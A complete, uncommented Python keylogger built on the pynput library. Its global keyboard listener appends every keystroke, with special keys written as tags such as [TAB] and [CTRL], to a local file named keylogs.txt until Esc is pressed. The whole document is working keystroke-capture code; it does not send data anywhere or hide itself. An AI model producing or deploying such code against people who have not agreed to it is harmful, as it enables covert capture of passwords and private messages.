import pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(str(key.char))
    except AttributeError:
        with open("keylogs.txt", "a") as f:
            if key == keyboard.Key.esc:
                return False
            elif key == keyboard.Key.tab:
                f.write('[TAB]')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE]')
            elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
                f.write('[SHIFT]')
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                f.write('[CTRL]')
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                f.write('[ALT]')
            elif key == keyboard.Key.caps_lock:
                f.write('[CAPS_LOCK]')
            elif key == keyboard.Key.esc:
                return False
            else:
                f.write(f'[{key.name.upper()}]')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()